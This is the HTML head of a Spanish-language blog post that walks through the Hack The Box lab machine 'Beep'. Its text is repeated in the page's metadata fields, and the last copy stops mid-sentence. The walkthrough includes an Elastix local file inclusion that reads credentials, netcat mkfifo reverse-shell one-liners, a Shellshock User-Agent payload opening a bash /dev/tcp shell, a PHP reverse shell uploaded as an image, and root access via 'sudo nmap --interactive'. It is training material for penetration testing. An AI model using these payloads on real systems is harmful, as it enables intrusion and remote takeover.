<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Beep - Hack The Box</title>

  <link rel="shortcut icon" href="/assets/images/favicon.ico">
  <link rel="icon" href="/assets/iamges/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/images/favicon.gif" type="image/gif">

  <link rel="stylesheet" href="/assets/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Beep - Hack The Box | Filthy Hacker</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Beep - Hack The Box" />
<meta name="author" content="m4teo" />
<meta property="og:locale" content="es" />
<meta name="description" content="En esta ocasión vamos a resolver la máquina Beep de Hack The Box. Es una máquina Linux de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma. Esta máquina nos permite realizar, tanto la intrusión, como la escalada de privilegios, de distintas maneras, por lo que es genial para aprender algunas técnicas de explotación, las cuales vamos a cubrir. Fase De Reconocimiento Primeramente vamos a lanzar una traza ICMP para saber si la máquina está activa. ping -c 1 10.10.10.7 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del TTL; en este caso el valor del TTL de la máquina es 63, por lo que podemos intuir que estamos ante una máquina Linux. Recordemos que algunos de los valores referenciales son los siguientes: Sistema Operativo (OS) TTL Linux 64 Windows 128 Solaris 254 Si nos damos cuenta, en esta ocasión, el valor del TTL es 63 y no 64 como indica la tabla anterior, esto se debe a que en el entorno de máquinas de Hack The Box, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el TTL disminuye en una unidad. ping -c 1 10.10.10.7 -R Posteriormente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n 10.10.10.7 En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abiertos algunos puertos relacionados con HTTP y HTTPS. Debido a que la máquina cuenta con estos puertos abiertos, podríamos intentar aplicar fuzzing, no obstante, no vamos a encontrar nada interesante. Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de WhatWeb, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web. whatweb http://10.10.10.7 whatweb https://10.10.10.7 whatweb https://10.10.10.7:10000 Como podemos observar, no hay nada especialmente relevante, a excepción de ese error relacionado con SSL que aparece cuando visitamos la página a través del protocolo HTTPS, el cual no es nada grave, y de hecho lo veremos en un momento. En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador. Vemos que al abrir la primera página desde nuestro navegador (y por consiguiente la segunda, pues se está aplicando un redirect como pudimos ver en lo reportado por WhatWeb), nos salta un aviso de que la conexión no es segura, y esto se debe a que el certificado SSL que se está empleando, es autofirmado, por lo que se lo considera inseguro. En esta ocasión, y como sabemos que la página web pertenece a HackTheBox, haremos caso omiso a la advertencia y procederemos a la página web. Lo primero que llama nuestra atención es Elastix, el cual es un software encargado de unificar servicios PBX IP, correo electrónico, mensajería instantánea, fax entre otros, el cual va bastante de la mano con Asterisk. Respecto a la tercera página web, el navegador nuevamente nos avisará del certificado SSL autofirmado, aviso, el cual una vez más obviaremos. Una vez dentro, lo primero que vemos es un panel que nos pide autenticar para tener acceso a Webmin, una herramienta que permite la administración de servicios basados en Unix. Fase De Explotación Como mencioné en un inicio, la máquina Beep cuenta con varios vectores para realizar la fase de explotación; de hecho, para tres de ellos ni siquiera hace falta la escalada de privilegios. Fase De Explotación - Local File Inclusion Lo primero que se nos puede ocurrir a la hora de encontrar un panel de login, sería probar contraseñas por defecto (un error bastante común aún hoy en día). Sin embargo, ninguna de las siguientes credenciales nos es de ayuda para logearnos en el servicio de Elastix La siguiente idea que podemos probar, sería buscar algún tipo de exploit para el servicio Elastix; para ello utilizaremos SearchSploit. searchsploit Elastix En este caso SearchSploit nos muestra algunos exploits interesantes, sin embargo, nos vamos a quedar con el que nos permite realizar un Local File Inclusion (LFI), vulnerabilidad que ya revisamos. En este caso no nos haría falta descargar el exploit, ya que lo más probable es que nos indique en que ruta podemos aplicar el LFI. searchsploit -x php/webapps/37637.pl En efecto, pero antes de intentar explotar este LFI, debemos confirmar si en primer lugar existe la primera ruta, /vtigercrm/. Una vez confirmamos que la ruta existe, podemos pasar a explotar el LFI. Si nos percatamos, se está haciendo uso de un null byte, así como de varios directory path traversal, esto con el fin de leer el archivo /etc/amportal.conf, pero perfectamente podríamos listar cualquier otro archivo del sistema. Leer esto así es un poco complicado, así que podríamos hacer Ctrl + U, para verlo de mejor manera. El archivo /etc/amportal.conf, como su nombre mismo indica, es un archivo de configuración para el portal de gestión de Asterisk. Si recordamos, otro servicio que detectamos con Nmap, fue el servicio SSH en el puerto 22. Por lo que procederemos a autenticarnos con las credenciales encontradas: ssh root@10.10.10.7 Al intentar conectarnos por SSH, vemos que la conexión no se puede establecer debido a que no existe un algoritmo de encriptación en común entre la máquina víctima, y nuestra máquina de atacante. Para solucionar este problema, debemos forzar a nuestra máquina usar alguno de los algoritmos que se nos presenta, pese a ser considerados como menos seguros. ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7 Al habernos conectado a la máquina directamente como root, no es necesario realizar la escalada de privilegios, por lo que podríamos listar sin ningún problema tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios. Fase De Explotación - Webmin Al igual que intentamos probar contraseñas por defecto en el panel de login del servicio Elastix, podemos hacer lo mismo en el panel de autenticación del servicio Webmin, pero al igual que ocurrió antes, las siguientes credenciales no nos permiten ingresar. Otra opción muy buena sería utilizar las credenciales que encontramos antes, las cuales de hecho funcionan, es decir, se están reutilizando credenciales, otra muy mala práctica que aún hoy en día, persiste. Estando dentro podríamos programar la ejecución de cualquier comando, a nivel de cualquier usuario en el sistema, en nuestro caso, nos interesa entablarnos una reverse shell; aquí tenemos algunos ejemplos, pero nosotros los vamos a hacer a través de NetCat. Para lo cual, desde nuestra máquina de atacantes deberemos de ponernos en escucha a través del puerto que queramos. sudo nc -nlvp &lt;puertoCualquiera&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f Después de darle a save, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios. De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios. Fase De Explotación - Shellshock Si nos percatamos, en el ataque anterior, depués de haber intentado ingresar como un usuario no válido, se añade al url /session_login.cgi Esto llama nuestra atención ya que los archivos de extensión .cgi, o dentro del directorio /cgi-bin/, son utilizados para ejecutar programas en el servidor, y esto lo hacen a través de una interfaz de línea comandos (CLI), por lo que, si la bash es vulnerable, podemos realizar un ataque shellshock. Lo más cómodo sería realizar este ataque desde nuestra terminal, sin embargo, debido al problema del certificado SSL autofirmado, a la hora de utilizar el comando curl, nos va a dar un error. Este error lo podríamos solucionar utilizando uno de los parámetros que nos otorga curl, concretamente el parámetro -k o --insecure, el cual permite tramitar este tipo de peticiones inseguras. Sin embargo, ni así, nos es posible explotar el shellshock de esta forma, por lo que tendremos que hacerlo de otra manera. Para poder cambiar el User-Agent de otra forma, podríamos hacerlo a través de Burp Suite, y así, entablarnos una reverse shell. Primero vamos a emitir una petición al panel de autenticación con credenciales al azar, y posteriormente, desde Burp Suite, con Ctrl + R, vamos a mandar nuestra petición al Repeater. Después, vamos a borrar el contenido que se encuentra en el campo User-Agent, y lo vamos a reemplazar con nuestro código malicioso. Para variar un poco, la reverse shell la conseguiremos a través de bash, a diferencia de como lo hicimos en la explotación del servicio Webmin; nuevamente, este tipo de reverse shells, las podemos conseguir aquí. En primer lugar, desde nuestra máquina de atacantes, a través de NetCat, tenemos que ponernos en escucha a través de un puerto cualquiera. sudo nc -nlvp &lt;puertoCualquiera&gt; Y, el código malicioso que vamos a ingresar en el campo User-Agent será: () { :; }; bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/&lt;puertoCualquiera&gt; 0&gt;&amp;1 Finalmente, presionaremos el botón Send, para que emitir nuestra petición. Y al igual que en los casos anteriores, sin necesidad de escalada de privilegios, podremos leer tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios, sin ninguna complicación. Fase De Explotación - File Upload Bypass Si recordamos, en la fase de explotación a través del uso de un LFI, habíamos descubierto un panel de login de Vtiger CRM; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado. Y en efecto, una vez dentro, podemos empezar a investigar un poco; en el apartado Settings/Company Details, vamos a ver que hay una opción que nos permite cambiar el logo de la compañía, por lo que ya vamos teniendo una idea, de que podemos hacer. De manera casi similar a la máquina Vulnversity de TryHackMe, vamos a tener que disfrazar un archivo .php como .jpg. No obstante, en este caso será un poco más sencillo ya que no haremos uso de Burp Suite (aunque podríamos); lo único que vamos a hacer es añadir la extensión .jpg a nuestra reverseShell.php. Podríamos utilizar la reverse shell que nos provee pentestmonkey (para lo cual debemos modificar el campo ip, y colocar la nuestra, y si quisiéramos el campo port), o bien, crear nuestra propia reverse shell. &lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f&quot;); ?&gt; Y al igual que en los casos anteriores, previo a darle a Save, debemos de estar en escucha a través de NetCat, por el puerto que hayamos indicado en nuestra reverse shell. sudo nc -nlvp &lt;puertoCualquiera&gt; Si nos percatamos, a diferencia de los casos anteriores, en esta ocasión ya no somos el usuario root, somos el usuario asterisk, por lo que ahora si debemos de realizar la escalada de privilegios. Escalada De Privilegios Para conseguir la primera flag, no tenemos que realizar ningún proceso, como el usuario asterisk, nos es posible leer la flag del usuario con bajos privilegios. Para conseguir la flag del usuario con máximos privilegios, al ser el usuario asterisk, será bastante sencillo, ya que este usuario usualmente tiene acceso a ejecutar algunos binarios haciendo uso de sudo, por lo que, lo primero que vamos a hacer es listar que binarios podemos ejecutar como root. sudo -l La mejor forma para abusar de cualquier binario, es recurrir a GTFOBins, esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios con permisos SUID mal asignados, y en este caso, binarios que se pueden ejecutar como root. En este caso, tenemos un abanico de oportunidades, tenemos binarios como chmod, chown, service, yum, y el binario que vamos a explotar en esta ocasión: nmap. Para explotar el binario nmap, bastará con ejecutar su modo interactivo, con el cual después, generaremos una bash con máximo privilegios. sudo nmap --interactive !sh Posterior a ello, podemos buscar la flag dentro de todo el sistema, y leerla." />
<meta property="og:description" content="En esta ocasión vamos a resolver la máquina Beep de Hack The Box. Es una máquina Linux de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma. Esta máquina nos permite realizar, tanto la intrusión, como la escalada de privilegios, de distintas maneras, por lo que es genial para aprender algunas técnicas de explotación, las cuales vamos a cubrir. Fase De Reconocimiento Primeramente vamos a lanzar una traza ICMP para saber si la máquina está activa. ping -c 1 10.10.10.7 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del TTL; en este caso el valor del TTL de la máquina es 63, por lo que podemos intuir que estamos ante una máquina Linux. Recordemos que algunos de los valores referenciales son los siguientes: Sistema Operativo (OS) TTL Linux 64 Windows 128 Solaris 254 Si nos damos cuenta, en esta ocasión, el valor del TTL es 63 y no 64 como indica la tabla anterior, esto se debe a que en el entorno de máquinas de Hack The Box, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el TTL disminuye en una unidad. ping -c 1 10.10.10.7 -R Posteriormente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n 10.10.10.7 En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abiertos algunos puertos relacionados con HTTP y HTTPS. Debido a que la máquina cuenta con estos puertos abiertos, podríamos intentar aplicar fuzzing, no obstante, no vamos a encontrar nada interesante. Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de WhatWeb, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web. whatweb http://10.10.10.7 whatweb https://10.10.10.7 whatweb https://10.10.10.7:10000 Como podemos observar, no hay nada especialmente relevante, a excepción de ese error relacionado con SSL que aparece cuando visitamos la página a través del protocolo HTTPS, el cual no es nada grave, y de hecho lo veremos en un momento. En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador. Vemos que al abrir la primera página desde nuestro navegador (y por consiguiente la segunda, pues se está aplicando un redirect como pudimos ver en lo reportado por WhatWeb), nos salta un aviso de que la conexión no es segura, y esto se debe a que el certificado SSL que se está empleando, es autofirmado, por lo que se lo considera inseguro. En esta ocasión, y como sabemos que la página web pertenece a HackTheBox, haremos caso omiso a la advertencia y procederemos a la página web. Lo primero que llama nuestra atención es Elastix, el cual es un software encargado de unificar servicios PBX IP, correo electrónico, mensajería instantánea, fax entre otros, el cual va bastante de la mano con Asterisk. Respecto a la tercera página web, el navegador nuevamente nos avisará del certificado SSL autofirmado, aviso, el cual una vez más obviaremos. Una vez dentro, lo primero que vemos es un panel que nos pide autenticar para tener acceso a Webmin, una herramienta que permite la administración de servicios basados en Unix. Fase De Explotación Como mencioné en un inicio, la máquina Beep cuenta con varios vectores para realizar la fase de explotación; de hecho, para tres de ellos ni siquiera hace falta la escalada de privilegios. Fase De Explotación - Local File Inclusion Lo primero que se nos puede ocurrir a la hora de encontrar un panel de login, sería probar contraseñas por defecto (un error bastante común aún hoy en día). Sin embargo, ninguna de las siguientes credenciales nos es de ayuda para logearnos en el servicio de Elastix La siguiente idea que podemos probar, sería buscar algún tipo de exploit para el servicio Elastix; para ello utilizaremos SearchSploit. searchsploit Elastix En este caso SearchSploit nos muestra algunos exploits interesantes, sin embargo, nos vamos a quedar con el que nos permite realizar un Local File Inclusion (LFI), vulnerabilidad que ya revisamos. En este caso no nos haría falta descargar el exploit, ya que lo más probable es que nos indique en que ruta podemos aplicar el LFI. searchsploit -x php/webapps/37637.pl En efecto, pero antes de intentar explotar este LFI, debemos confirmar si en primer lugar existe la primera ruta, /vtigercrm/. Una vez confirmamos que la ruta existe, podemos pasar a explotar el LFI. Si nos percatamos, se está haciendo uso de un null byte, así como de varios directory path traversal, esto con el fin de leer el archivo /etc/amportal.conf, pero perfectamente podríamos listar cualquier otro archivo del sistema. Leer esto así es un poco complicado, así que podríamos hacer Ctrl + U, para verlo de mejor manera. El archivo /etc/amportal.conf, como su nombre mismo indica, es un archivo de configuración para el portal de gestión de Asterisk. Si recordamos, otro servicio que detectamos con Nmap, fue el servicio SSH en el puerto 22. Por lo que procederemos a autenticarnos con las credenciales encontradas: ssh root@10.10.10.7 Al intentar conectarnos por SSH, vemos que la conexión no se puede establecer debido a que no existe un algoritmo de encriptación en común entre la máquina víctima, y nuestra máquina de atacante. Para solucionar este problema, debemos forzar a nuestra máquina usar alguno de los algoritmos que se nos presenta, pese a ser considerados como menos seguros. ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7 Al habernos conectado a la máquina directamente como root, no es necesario realizar la escalada de privilegios, por lo que podríamos listar sin ningún problema tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios. Fase De Explotación - Webmin Al igual que intentamos probar contraseñas por defecto en el panel de login del servicio Elastix, podemos hacer lo mismo en el panel de autenticación del servicio Webmin, pero al igual que ocurrió antes, las siguientes credenciales no nos permiten ingresar. Otra opción muy buena sería utilizar las credenciales que encontramos antes, las cuales de hecho funcionan, es decir, se están reutilizando credenciales, otra muy mala práctica que aún hoy en día, persiste. Estando dentro podríamos programar la ejecución de cualquier comando, a nivel de cualquier usuario en el sistema, en nuestro caso, nos interesa entablarnos una reverse shell; aquí tenemos algunos ejemplos, pero nosotros los vamos a hacer a través de NetCat. Para lo cual, desde nuestra máquina de atacantes deberemos de ponernos en escucha a través del puerto que queramos. sudo nc -nlvp &lt;puertoCualquiera&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f Después de darle a save, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios. De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios. Fase De Explotación - Shellshock Si nos percatamos, en el ataque anterior, depués de haber intentado ingresar como un usuario no válido, se añade al url /session_login.cgi Esto llama nuestra atención ya que los archivos de extensión .cgi, o dentro del directorio /cgi-bin/, son utilizados para ejecutar programas en el servidor, y esto lo hacen a través de una interfaz de línea comandos (CLI), por lo que, si la bash es vulnerable, podemos realizar un ataque shellshock. Lo más cómodo sería realizar este ataque desde nuestra terminal, sin embargo, debido al problema del certificado SSL autofirmado, a la hora de utilizar el comando curl, nos va a dar un error. Este error lo podríamos solucionar utilizando uno de los parámetros que nos otorga curl, concretamente el parámetro -k o --insecure, el cual permite tramitar este tipo de peticiones inseguras. Sin embargo, ni así, nos es posible explotar el shellshock de esta forma, por lo que tendremos que hacerlo de otra manera. Para poder cambiar el User-Agent de otra forma, podríamos hacerlo a través de Burp Suite, y así, entablarnos una reverse shell. Primero vamos a emitir una petición al panel de autenticación con credenciales al azar, y posteriormente, desde Burp Suite, con Ctrl + R, vamos a mandar nuestra petición al Repeater. Después, vamos a borrar el contenido que se encuentra en el campo User-Agent, y lo vamos a reemplazar con nuestro código malicioso. Para variar un poco, la reverse shell la conseguiremos a través de bash, a diferencia de como lo hicimos en la explotación del servicio Webmin; nuevamente, este tipo de reverse shells, las podemos conseguir aquí. En primer lugar, desde nuestra máquina de atacantes, a través de NetCat, tenemos que ponernos en escucha a través de un puerto cualquiera. sudo nc -nlvp &lt;puertoCualquiera&gt; Y, el código malicioso que vamos a ingresar en el campo User-Agent será: () { :; }; bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/&lt;puertoCualquiera&gt; 0&gt;&amp;1 Finalmente, presionaremos el botón Send, para que emitir nuestra petición. Y al igual que en los casos anteriores, sin necesidad de escalada de privilegios, podremos leer tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios, sin ninguna complicación. Fase De Explotación - File Upload Bypass Si recordamos, en la fase de explotación a través del uso de un LFI, habíamos descubierto un panel de login de Vtiger CRM; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado. Y en efecto, una vez dentro, podemos empezar a investigar un poco; en el apartado Settings/Company Details, vamos a ver que hay una opción que nos permite cambiar el logo de la compañía, por lo que ya vamos teniendo una idea, de que podemos hacer. De manera casi similar a la máquina Vulnversity de TryHackMe, vamos a tener que disfrazar un archivo .php como .jpg. No obstante, en este caso será un poco más sencillo ya que no haremos uso de Burp Suite (aunque podríamos); lo único que vamos a hacer es añadir la extensión .jpg a nuestra reverseShell.php. Podríamos utilizar la reverse shell que nos provee pentestmonkey (para lo cual debemos modificar el campo ip, y colocar la nuestra, y si quisiéramos el campo port), o bien, crear nuestra propia reverse shell. &lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f&quot;); ?&gt; Y al igual que en los casos anteriores, previo a darle a Save, debemos de estar en escucha a través de NetCat, por el puerto que hayamos indicado en nuestra reverse shell. sudo nc -nlvp &lt;puertoCualquiera&gt; Si nos percatamos, a diferencia de los casos anteriores, en esta ocasión ya no somos el usuario root, somos el usuario asterisk, por lo que ahora si debemos de realizar la escalada de privilegios. Escalada De Privilegios Para conseguir la primera flag, no tenemos que realizar ningún proceso, como el usuario asterisk, nos es posible leer la flag del usuario con bajos privilegios. Para conseguir la flag del usuario con máximos privilegios, al ser el usuario asterisk, será bastante sencillo, ya que este usuario usualmente tiene acceso a ejecutar algunos binarios haciendo uso de sudo, por lo que, lo primero que vamos a hacer es listar que binarios podemos ejecutar como root. sudo -l La mejor forma para abusar de cualquier binario, es recurrir a GTFOBins, esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios con permisos SUID mal asignados, y en este caso, binarios que se pueden ejecutar como root. En este caso, tenemos un abanico de oportunidades, tenemos binarios como chmod, chown, service, yum, y el binario que vamos a explotar en esta ocasión: nmap. Para explotar el binario nmap, bastará con ejecutar su modo interactivo, con el cual después, generaremos una bash con máximo privilegios. sudo nmap --interactive !sh Posterior a ello, podemos buscar la flag dentro de todo el sistema, y leerla." />
<meta property="og:site_name" content="Filthy Hacker" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-12-06T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Beep - Hack The Box" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4teo","url":"https://mateonitro550.github.io"},"dateModified":"2021-12-06T00:00:00-05:00","datePublished":"2021-12-06T00:00:00-05:00","description":"En esta ocasión vamos a resolver la máquina Beep de Hack The Box. Es una máquina Linux de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma. Esta máquina nos permite realizar, tanto la intrusión, como la escalada de privilegios, de distintas maneras, por lo que es genial para aprender algunas técnicas de explotación, las cuales vamos a cubrir. Fase De Reconocimiento Primeramente vamos a lanzar una traza ICMP para saber si la máquina está activa. ping -c 1 10.10.10.7 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del TTL; en este caso el valor del TTL de la máquina es 63, por lo que podemos intuir que estamos ante una máquina Linux. Recordemos que algunos de los valores referenciales son los siguientes: Sistema Operativo (OS) TTL Linux 64 Windows 128 Solaris 254 Si nos damos cuenta, en esta ocasión, el valor del TTL es 63 y no 64 como indica la tabla anterior, esto se debe a que en el entorno de máquinas de Hack The Box, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el TTL disminuye en una unidad. ping -c 1 10.10.10.7 -R Posteriormente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n 10.10.10.7 En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abiertos algunos puertos relacionados con HTTP y HTTPS. Debido a que la máquina cuenta con estos puertos abiertos, podríamos intentar aplicar fuzzing, no obstante, no vamos a encontrar nada interesante. Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de WhatWeb, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web. whatweb http://10.10.10.7 whatweb https://10.10.10.7 whatweb https://10.10.10.7:10000 Como podemos observar, no hay nada especialmente relevante, a excepción de ese error relacionado con SSL que aparece cuando visitamos la página a través del protocolo HTTPS, el cual no es nada grave, y de hecho lo veremos en un momento. En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador. Vemos que al abrir la primera página desde nuestro navegador (y por consiguiente la segunda, pues se está aplicando un redirect como pudimos ver en lo reportado por WhatWeb), nos salta un aviso de que la conexión no es segura, y esto se debe a que el certificado SSL que se está empleando, es autofirmado, por lo que se lo considera inseguro. En esta ocasión, y como sabemos que la página web pertenece a HackTheBox, haremos caso omiso a la advertencia y procederemos a la página web. Lo primero que llama nuestra atención es Elastix, el cual es un software encargado de unificar servicios PBX IP, correo electrónico, mensajería instantánea, fax entre otros, el cual va bastante de la mano con Asterisk. Respecto a la tercera página web, el navegador nuevamente nos avisará del certificado SSL autofirmado, aviso, el cual una vez más obviaremos. Una vez dentro, lo primero que vemos es un panel que nos pide autenticar para tener acceso a Webmin, una herramienta que permite la administración de servicios basados en Unix. Fase De Explotación Como mencioné en un inicio, la máquina Beep cuenta con varios vectores para realizar la fase de explotación; de hecho, para tres de ellos ni siquiera hace falta la escalada de privilegios. Fase De Explotación - Local File Inclusion Lo primero que se nos puede ocurrir a la hora de encontrar un panel de login, sería probar contraseñas por defecto (un error bastante común aún hoy en día). Sin embargo, ninguna de las siguientes credenciales nos es de ayuda para logearnos en el servicio de Elastix La siguiente idea que podemos probar, sería buscar algún tipo de exploit para el servicio Elastix; para ello utilizaremos SearchSploit. searchsploit Elastix En este caso SearchSploit nos muestra algunos exploits interesantes, sin embargo, nos vamos a quedar con el que nos permite realizar un Local File Inclusion (LFI), vulnerabilidad que ya revisamos. En este caso no nos haría falta descargar el exploit, ya que lo más probable es que nos indique en que ruta podemos aplicar el LFI. searchsploit -x php/webapps/37637.pl En efecto, pero antes de intentar explotar este LFI, debemos confirmar si en primer lugar existe la primera ruta, /vtigercrm/. Una vez confirmamos que la ruta existe, podemos pasar a explotar el LFI. Si nos percatamos, se está haciendo uso de un null byte, así como de varios directory path traversal, esto con el fin de leer el archivo /etc/amportal.conf, pero perfectamente podríamos listar cualquier otro archivo del sistema. Leer esto así es un poco complicado, así que podríamos hacer Ctrl + U, para verlo de mejor manera. El archivo /etc/amportal.conf, como su nombre mismo indica, es un archivo de configuración para el portal de gestión de Asterisk. Si recordamos, otro servicio que detectamos con Nmap, fue el servicio SSH en el puerto 22. Por lo que 